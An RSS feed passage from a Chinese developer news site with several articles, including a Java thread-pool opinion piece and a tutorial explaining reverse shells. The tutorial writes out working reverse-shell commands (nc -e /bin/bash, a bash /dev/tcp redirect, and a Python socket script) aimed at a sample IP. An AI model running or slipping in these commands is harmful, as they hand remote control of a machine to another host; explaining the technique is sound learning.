<?xml version="1.0" encoding="UTF-8"?>
        <rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
            <channel>
            <title>开发者头条</title>
            <link>http://toutiao.io/</link>
            <description></description>
<item>
<guid>8815daf387c3e58251bc365cc64b8584</guid>
<title>为什么我饿了么技术总监不干，却要从事自由职业？</title>
<link>https://toutiao.io/k/hpupzay</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;profile_inner&quot;&gt;
                  &lt;strong class=&quot;profile_nickname&quot;&gt;叶小钗&lt;/strong&gt;
                  &lt;img class=&quot;profile_avatar&quot; id=&quot;js_profile_qrcode_img&quot; src=&quot;&quot; alt=&quot;&quot;/&gt;

                  &lt;p class=&quot;profile_meta&quot;&gt;
                  &lt;label class=&quot;profile_meta_label&quot;&gt;Weixin ID&lt;/label&gt;
                  &lt;span class=&quot;profile_meta_value&quot;&gt;erchonglin&lt;/span&gt;
                  &lt;/p&gt;

                  &lt;p class=&quot;profile_meta&quot;&gt;
                  &lt;label class=&quot;profile_meta_label&quot;&gt;About Feature&lt;/label&gt;
                  &lt;span class=&quot;profile_meta_value&quot;&gt;原为鹅厂、ctrip、baidu、一线开发，B站技术专家，现为一独角兽技术负责人，带200多人团队和1条产品线。公号多由一些感悟组成，核心聚焦团队管理、产品思考、数字化转型、公司治理，偶尔也会扯犊子。&lt;/span&gt;
                  &lt;/p&gt;
                &lt;/div&gt;
                &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>8d9715f1699224592a22fc6636e38da9</guid>
<title>阿里规约手动创建线程池，我为什么还继续使用Executors呢？</title>
<link>https://toutiao.io/k/owwky6z</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;rich_media_content                                       &quot; id=&quot;js_content&quot;&gt;
            &lt;section data-mpa-powered-by=&quot;yiban.io&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.69&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/Z85sZvtmju13RJgyiaBJtf4u0JJn7fthqw8M68UfJ3FmKgFMjmgetkOsFZXG5lF6iayYrW0IC9764XNAew3Dn37g/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;500&quot;/&gt;&lt;/section&gt;&lt;section draggable=&quot;false&quot; data-tools-id=&quot;77768&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;事先声明&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;题目并没有哗众取宠的意思，我确实有在用&lt;/span&gt;&lt;span&gt;Executors&lt;/span&gt;&lt;span&gt;创建线程池。本文也不会赘述有关线程池参数，线程状态等概念。&lt;/span&gt;&lt;/section&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;尽管我知道阿里规约手动创建线程池背后的深意，通过ThreadPoolExecutor创建线程池可以让使用者更加明确线程池的运行规则，规避资源耗尽的风险。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;资源耗尽的风险&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;资源耗尽的风险主要还是源于内存：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1、使用&lt;span&gt;Executors&lt;/span&gt;.newFixedThreadPool和&lt;span&gt;Executors&lt;/span&gt;.&lt;span&gt;newSingleThreadExecutor&lt;/span&gt;创建的线程池，等待队列默认值是&lt;/span&gt;&lt;span&gt;Integer.MAX_VALUE，基本等同于无&lt;/span&gt;&lt;span&gt;界&lt;/span&gt;&lt;span&gt;的队列。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;毋庸置疑，线程数肯定是有限的，尤其对于密集计算型任务，线程数设置太大只会徒增线程消耗，并不会提高任务执行效率。&lt;/span&gt;&lt;span&gt;如果请求量过大，大量的请求数据堆积在队列中，极有可能发生OOM。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、使用&lt;span&gt;Executors&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;newCachedThreadPool&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;Executors&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;newSingleThreadScheduledExecutor&lt;/span&gt;&lt;span&gt;创建的线程池，最大线程数是&lt;/span&gt;Integer.MAX_VALUE&lt;span&gt;，&lt;/span&gt;&lt;/span&gt;&lt;span&gt;基本等同于无限大。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;对于大量的请求，无限的创建线程，&lt;/span&gt;&lt;span&gt;ThreadStackSize按1024k算，极有可能发生OOM。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;为什么我使用&lt;/span&gt;&lt;span&gt;Executors&lt;/span&gt;&lt;span&gt;创建线程池&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;原因有两个：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1、不喜欢各类的条条框框，Java包括Java生态圈本身已经有很多规约了，还需要阿里再来一套规约？&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、Java既然自带了这样的线程池工具，应该有用武之地。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;我个人看来，使用&lt;span&gt;Executors&lt;/span&gt;和直接使用&lt;span&gt;ThreadPoolExecutor&lt;/span&gt;并没有本质区别，更多的关注还应该放在任务本身。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;假设使用&lt;span&gt;Executors&lt;/span&gt;创建的线程池会出现OOM，那么采用&lt;span&gt;ThreadPoolExecutor&lt;/span&gt;就能规避吗？答案大概率是否定的。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;几点使用线程池的考虑&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;我通常会先考虑以下几点：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1、任务偏IO还是偏计算&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、通常程序线程池用来处理小而多批量任务&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;3、线程数量和CPU核数相呼应&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;4、请求量多少和请求量大小&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;5、定时监控线程池当前运行状态&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;6、线程数量可以动态设置&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;7、适当的控制线程数&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;8、任务耗时的话尽量去拆分或优化&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;场景假设&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;先来看个场景，假设A会持续向B推送数据，量级为1亿，payload为100B；B收到数据后进行应答后，A会继续向B推送；为了A不影响数据推送，&lt;/span&gt;&lt;span&gt;B会直接应答，然后线程池异步处理A推送来的数据。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;可能假设场景有些鸡肋，但现实也不乏这种场景，将就着看吧。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;假设使用&lt;span&gt;Executors&lt;/span&gt;.newFixedThreadPool创建线程数为10的线程池，单个线程执行一次任务耗时10ms，想想看，5min中后，&lt;/span&gt;&lt;span&gt;线程池处理了10*100*300个任务，忽略线程切换带来的损耗，累计处理30w个任务。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;剩下还有约1亿的数据堆积到了队列中。&lt;/span&gt;&lt;span&gt;100B*100000000/1024，大约9g的数据，绝对&lt;/span&gt;&lt;span&gt;OOM了。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;问题的根本原因&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;那问题来了，使用&lt;span&gt;ThreadPoolExecutor的话&lt;/span&gt;我应该开多少个线程？队列应该设置多大？数据来了线程满了，队列满了，直接丢弃数据？还是业务线程本身继续执行？&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;这个时候线程基本已经忙不过来了，CPU狂飙，内存OOM。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;分析现状解决问题&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;显然这个时候需要把速度降下来，而不是无脑提交到线程池中。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;我们对照上面几点重新优化下这个程序流程：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1、任务是偏计算型的，4核开10个线程还算合理，可以动态设置线程数再进行调试&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、请求量总大小大约10g，对于8g内存的应用，考虑占用1g内存，大约10000个任务数据&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;3、使用&lt;span&gt;Executors&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;newSingleThreadScheduledExecutor&lt;/span&gt;定时监控线程池的状态&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;针对上面的无脑分析&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1、我们使用&lt;span&gt;Executors&lt;/span&gt;.newFixedThreadPool和&lt;span&gt;Executors&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;newSingleThreadScheduledExecutor&lt;/span&gt;，前者用来执行任务，后者用来定时输出线程池状态&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、B端协商A端，每次推送1000个数据，10个线程处理10000个，使用信号量严格控制，数据不进队列；&lt;/span&gt;&lt;span&gt;亦或使用信号量控制，队列至多进入10000个数据；&lt;/span&gt;&lt;span&gt;信号量大小为10000+线程数&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;3、动态设置线程池最大线程数，定时监控线程池状态，没什么神奇，线程池提供了这样的方法&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;section draggable=&quot;false&quot;&gt;&lt;section&gt;&lt;secyion&gt;&lt;section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;总结&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;/secyion&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;span&gt;以上就是本文所要阐述的观点，主要想表达以下几点：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;1、任何规约不要盲从&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、尽可能多地关注自己的业务数据&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;3、合理利用线程池&lt;/span&gt;&lt;/p&gt;
          &lt;/div&gt;

          

          



           
                          
              &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>d2bbddb8bd4db6583444cd020d4e4a02</guid>
<title>什么是反弹 Shell？</title>
<link>https://toutiao.io/k/ltdnh1m</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;section data-tool=&quot;mdnice编辑器&quot; data-website=&quot;https://www.mdnice.com&quot;&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-galleryid=&quot;&quot; data-ratio=&quot;0.6666666666666666&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/atOH362BoyvhaOicxWgZtxUs5b44yCmIap0MkUAcj4y5xYd0ZI62DiaJPkopWHqKcUIyiaZ6lvb1hmH2MjyrNCG5g/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;section&gt;&lt;span/&gt;&lt;/section&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;前段时间被一位产品经理嘲笑了，说我居然连反弹 Shell 都不知道&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;说实话当时我还真不知道，但这口气咽不下去啊，得赶紧学来看看，这不，我已经学会了&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;学完之后我特地来记录下，同时分享给大家，以后产品经理再也不敢嘲笑我们不懂反弹 Shell 了&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;什么是反弹 Shell&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们都知道 Shell 的概念吧，简单来说，Shell 就是实现用户命令的接口，通过这个接口我们就能实现对计算机的控制，比如我们常见的 ssh 就是执行的 Shell 命令实现对远程对服务器的控制&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;那反弹 Shell 是啥呢？&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;其英文名叫做 Reverse Shell，具体干什么的呢？就是控制端首先监听某个 TCP/UDP 端口，然后被控制端向这个端口发起一个请求，同时将自己命令行的输入输出转移到控制端，从而控制端就可以输入命令来控制被控端了&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;比如说，我们有两台主机 A、B，我们最终想实现在 A 上控制 B。那么如果用正向 Shell，其实就是在 A 上输入 B 的连接地址，比如通过 ssh 连接到 B，连接成功之后，我们就可以在 A 上通过命令控制 B 了。如果用反向 Shell，那就是在 A 上先开启一个监听端口，然后让 B 去连接 A 的这个端口，连接成功之后，A 这边就能通过命令控制 B了&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;反弹 Shell 有什么用？&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;还是原来的例子，我们想用 A 来控制 B，如果想用 ssh 等命令来控制，那得输入 B 的 sshd 地址或者端口对吧？但是在很多情况下，由于防火墙、安全组、局域网、NAT 等原因，我们实际上是无法直接连接到 B 的&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;比如：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;A 虽然有公网 IP，但 B 是一个处于内网的机器，A 就没法直接连到 B 上&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;B 上开了防火墙或者安全组限制，sshd 的服务端口 22 被封闭了&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;B 是一台拨号主机，其 IP 地址经常变动&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;假如 B 被攻击了，我们想让 B 向 A 汇报自己的状况，那自然就需要 B 主动去连接 A&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果是这些情况，我们就可以用反弹 Shell 用 A 来控制 B 了&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;反弹 Shell 案例&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;首先我们先看一个标准的反弹 Shell 的例子，这里我们一共需要两台主机：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;A 是控制端，可以处于公网之中，也可以和 B 处于一个局域网中，总之能让 B 找到 A 就行&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;B 是被控端，可以处在局域网之中&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在开始之前我们需要用到 nc 命令，安装非常简单&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果是 CentOS 系列系统，安装命令如下：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;yum install -y nc # CentOS&lt;br/&gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如果是 Ubuntu 系列系统，安装命令可以参考 &lt;span&gt;https://stackoverflow.com/questions/10065993/how-to-switch-to-netcat-traditional-in-ubuntu&lt;/span&gt;&lt;sup&gt;[1]&lt;/sup&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;接着，我们在 A 上执行如下命令：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;nc -lvp 32767&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这个命令的意思是开启 32767 的端口监听，运行之后如图所示：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.23426212590299278&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/DAE6TYB3GWibRnMC5leYoDDgwtiadCibTyLSnA1bhXjpJibxQTz00NicicCgGlHIRicnZGVOibX0GV2joTibEUhuX5ssKsQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1938&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这样就表明 A 上正在监听 32767 端口的连接了&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这时候，我们可以在 B 上通过类似的命令连接到 A，假如 A 的 IP 是 111.112.113.114，那么命令如下：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;nc 111.112.113.114 32767 -e /bin/bash&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;“&lt;/span&gt;&lt;p&gt;注意：你在运行的时候需要替换成 A 的真实 IP 和端口。&lt;/p&gt;&lt;span&gt;”&lt;/span&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;运行完毕之后，我们反过来观察下 A，就显示了来自某个 IP 和端口的连接，我们就可以输入命令来控制 B 了，比如这里我们输入了：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;uname -a&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;然后就可以得到 B 的主机名了&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如图所示：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.1930164888457808&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/DAE6TYB3GWibRnMC5leYoDDgwtiadCibTyLo2xjZjVK4K0zQLES6Vhqn9ugLVrU1OCItO1nZldlMp0tXibkpADdsXg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;2062&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这样我们就通过 nc 包实现了反弹 Shell&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;有人说，这 B 上一定需要安装 nc 这个包吗？&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;其实不一定的，我们可以直接使用 bash 来实现反弹 Shell，命令如下：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/111.112.113.114/32767 0&amp;gt;&amp;amp;1&lt;br/&gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这个命令大致解释下：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;bash -i&lt;/code&gt; 就是产生一个 bash 交互环境&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;&amp;gt;&amp;amp;&lt;/code&gt;可以将 bash 交互环境的输入、输出、错误输出都输出到一个地方&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;/dev/tcp/111.112.113.114/32767&lt;/code&gt; 其实指的就是目标主机的一个连接地址，因为 Linux 环境中所有内容的定义都是以文件的形式存在的，指定这个地址就是让主机和目标主机建立一个 TCP 连接&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;0&amp;gt;&amp;amp;1&lt;/code&gt;可以将标准输入和标准输出相结合，重定向给前面标准输出的内容&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;通过这样的命令，我们就可以就是将 B的标准输出和错误输出都重定向给 A，并且将 A 的输入都重定向给 B，这样我们就可以实现 A 对 B 的远程控制了&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;如图所示：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.33751743375174337&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/DAE6TYB3GWibRnMC5leYoDDgwtiadCibTyLtcicvFS3wUrItkssuIibrrAiclOZ2lsRlI7bLw5QNZibvVuA9HV6MXnCxg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;717&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;比如这样我们就可以轻松在 A 主机上拿到 B 主机的主机名、当前所处路径等内容了&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;另外除了用 bash，我们还可以利用 Python 进行反弹 Shell，脚本如下：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;python -c &#x27;import socket,subprocess,os; \&lt;br/&gt;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);&lt;br/&gt;s.connect((&quot;111.112.113.114&quot;,32767));&lt;br/&gt;os.dup2(s.fileno(),0);&lt;br/&gt;os.dup2(s.fileno(),1);&lt;br/&gt;os.dup2(s.fileno(),2);&lt;br/&gt;p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&lt;br/&gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;可以达到同样反弹 Shell 的效果，即可以用 A 来控制 B&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;总结&lt;/span&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;以上就是反弹 Shell 的介绍，灵活运用反弹 Shell 可以大大便利某些场景下的远程控制，希望对大家有帮助&lt;/p&gt;&lt;section class=&quot;mp_profile_iframe_wrp&quot;&gt;&lt;mpprofile class=&quot;js_uneditable custom_select_card mp_profile_iframe&quot; data-pluginname=&quot;mpprofile&quot; data-id=&quot;MzU1OTI0NjI1NQ==&quot; data-headimg=&quot;http://mmbiz.qpic.cn/mmbiz_png/atOH362BoyuUe1icelWmbMyTCRwoFPScmosYQheSZ9wsmr61Bfr2rvNav9j9QpDnUulNpCotEiaAoLzSAm4jZTjA/0?wx_fmt=png&quot; data-nickname=&quot;AirPython&quot; data-alias=&quot;AirPython&quot; data-signature=&quot;专注于Python爬虫/自动化/Web原创技术干货！&quot; data-from=&quot;0&quot;/&gt;&lt;/section&gt;&lt;section&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-tools=&quot;135编辑器&quot; data-id=&quot;93451&quot;&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-tools=&quot;135编辑器&quot; data-id=&quot;92877&quot;&gt;&lt;section&gt;&lt;br/&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;section&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-tools=&quot;135编辑器&quot; data-id=&quot;93451&quot;&gt;&lt;section data-role=&quot;outer&quot; label=&quot;Powered by 135editor.com&quot;&gt;&lt;section data-tools=&quot;135编辑器&quot; data-id=&quot;92877&quot;&gt;&lt;section data-width=&quot;100%&quot;&gt;&lt;section&gt;&lt;section data-brushtype=&quot;text&quot;&gt;&lt;span&gt;好文和朋友一起看~&lt;/span&gt;&lt;em/&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;&lt;/section&gt;
          &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>0827361e95b682b9b1b376bbebb192ae</guid>
<title>干货 | 基于ClickHouse的复杂查询实现与优化</title>
<link>https://toutiao.io/k/zv87ntj</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;rich_media_content                           autoTypeSetting24psection&amp;#10;                          &quot; id=&quot;js_content&quot;&gt;
